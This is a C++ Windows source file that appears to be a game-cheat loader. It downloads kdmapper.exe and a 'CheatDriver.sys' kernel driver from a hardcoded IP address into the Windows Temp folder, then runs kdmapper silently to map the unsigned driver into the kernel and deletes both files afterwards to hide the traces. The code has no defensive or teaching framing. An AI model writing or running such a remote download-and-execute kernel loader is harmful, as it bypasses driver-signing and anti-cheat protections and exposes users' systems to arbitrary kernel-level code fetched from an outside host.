#include <iostream>
#include <fstream>
#include <cstdlib>
#include <urlmon.h>
#include "obfuscate.h"

#pragma comment(lib, "urlmon.lib")


void executeKdmapper(const std::string& kdmapperPath, const std::string& driverPath) {
    std::string command = kdmapperPath + " " + driverPath + " > NUL 2>&1";
    std::system(command.c_str());
}

int loader() {
    auto kdmapper_url = "http://91.191.173.36/kdmapper.exe"; // replace with your URL

    auto driver_url = "http://91.191.173.36/CheatDriver.sys"; // replace with your URL
    auto kdmapper_path = "C:\\Windows\\Temp\\kdmapper.exe";
    auto driver_path = "C:\\Windows\\Temp\\CheatDriver.sys";

    // Download kdmapper
    try
    {
        URLDownloadToFile(NULL, kdmapper_url, kdmapper_path, 0, NULL);
    }
    catch (std::exception& e) {
        std::cout << "Failed to download kdmapper file: Check URL. " << e.what() << std::endl;
        return 1;
    }

    try {
        URLDownloadToFile(NULL, driver_url, driver_path, 0, NULL);
    }
    catch (std::exception& e) {
        std::cout << "Failed to download driver file: Check URL. " << e.what() << std::endl;
        return 1;
    }



    // Load driver
    executeKdmapper(std::string(kdmapper_path), std::string(driver_path));



    // Clean up
    remove(kdmapper_path);
    remove(driver_path);

    return 0;
}
